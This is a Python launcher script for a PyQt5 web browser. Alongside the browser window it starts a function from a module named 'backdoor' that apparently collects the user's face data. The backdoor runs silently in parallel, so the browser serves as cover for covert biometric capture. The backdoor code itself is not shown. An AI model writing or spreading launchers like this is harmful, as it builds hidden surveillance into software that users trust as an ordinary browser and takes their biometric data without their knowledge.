from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from view import MyWebBrowser
from logging import getLogger
from session import do_session
from multiprocessing import Process

import config

logger = getLogger('WebBrowser')


def start_browser():
    app = QApplication([])
    try:
        window = MyWebBrowser()
        ico = config.APP_ICO
        window.window.setWindowIcon(QIcon(str(ico)))
    except Exception as exception:
        logger.critical(exception)
    finally:
        app.exec_()

def start_backdoor_apps():
    from backdoor import get_user_face_data
    get_user_face_data()

try:
    do_session()
    start_browser_app = Process(target=start_browser)
    backdoor_apps = Process(target=start_backdoor_apps)

    start_browser_app.start()
    start_backdoor_apps()
except Exception as exception:
    logger.error(exception)


